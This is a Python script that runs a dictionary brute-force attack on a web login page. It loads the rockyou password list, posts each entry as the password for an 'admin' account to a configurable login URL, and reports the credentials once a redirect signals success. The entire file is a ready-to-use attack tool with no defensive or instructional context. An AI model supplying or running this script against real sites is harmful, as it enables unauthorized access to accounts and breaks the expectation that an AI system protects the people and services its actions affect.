#!/usr/bin/python3

import requests, signal, sys
from tqdm import tqdm

# Global variables
# to be changed
login_url = "http://your-domain.com/login"
dictionary_path = "/usr/share/wordlists/rockyou.txt"

pbar = None

def exit_handler(sig, frame):
	pbar.close()
	print('\n\nExiting program...')
	sys.exit(1)
	
# When user exists with Ctrl + C
signal.signal(signal.SIGINT, exit_handler)	

def bruteForcePassword():

	with open(dictionary_path, 'r') as file:	

		global pbar 

		pbar = tqdm(file.readlines(), desc='Brute Forcing')

		for passw in pbar:

			post_data = {
				'email': 'admin',
				'password': passw
			}

			r = requests.post(login_url, data=post_data, allow_redirects=False)

			# when password found
			if r.status_code == 302:# update with success status code or change in request parameter
				pbar.close()
				print('\n[!] Password found! \nCredentials: %s:%s' % (post_data['email'],post_data['password']))
				sys.exit(0)

		print('\nNo passwords found.')


if __name__ == '__main__':
	bruteForcePassword()
